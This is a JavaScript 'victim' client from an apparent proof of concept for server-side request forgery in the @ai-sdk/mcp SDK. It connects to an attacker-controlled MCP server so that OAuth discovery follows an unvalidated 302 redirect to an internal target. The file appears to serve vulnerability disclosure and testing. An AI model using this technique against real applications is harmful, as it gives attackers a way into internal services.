/**
 * VICTIM: application using @ai-sdk/mcp.
 *
 * The victim only "connects" to the attacker MCP URL (as if an end user
 * registered that MCP server in a multi-tenant app, or a dev connected to it).
 *
 * Usage:
 *   MCP_URL=http://127.0.0.1:PORT node victim-client.mjs
 *
 * Watch the INTERNAL TARGET terminal: a HIT means SSRF succeeded.
 */
import { createMCPClient } from '@ai-sdk/mcp';

const MCP_URL = process.env.MCP_URL;
if (!MCP_URL) {
  console.error('Set MCP_URL to the attacker MCP, e.g.');
  console.error('  MCP_URL=http://127.0.0.1:12345 node victim-client.mjs');
  process.exit(1);
}

// Minimal OAuth provider so the SDK runs discovery after 401.
// validateAuthorizationServerURL is intentionally omitted: even if present,
// it does not validate the HTTP 302 redirect target (see report).
const authProvider = {
  get redirectUrl() {
    return 'http://localhost/callback';
  },
  get clientMetadata() {
    return { redirect_uris: ['http://localhost/callback'] };
  },
  clientInformation() {
    return undefined;
  },
  tokens() {
    return undefined;
  },
  saveTokens() {},
  redirectToAuthorization() {},
  saveCodeVerifier() {},
  codeVerifier() {
    return 'v';
  },
};

console.log('Victim connecting to MCP_URL=', MCP_URL);
let client;
try {
  client = await createMCPClient({
    transport: {
      type: 'http',
      url: MCP_URL,
      authProvider,
    },
  });
  await client.tools();
  console.log('Unexpected: client connected without error');
} catch (e) {
  console.log(
    'Victim client finished with error (often expected AFTER SSRF):',
    e?.message || String(e),
  );
} finally {
  try {
    await client?.close?.();
  } catch {}
}

console.log('Now check the INTERNAL TARGET terminal for: >>> HIT <<<');
console.log('If you see HIT, SSRF is confirmed.');
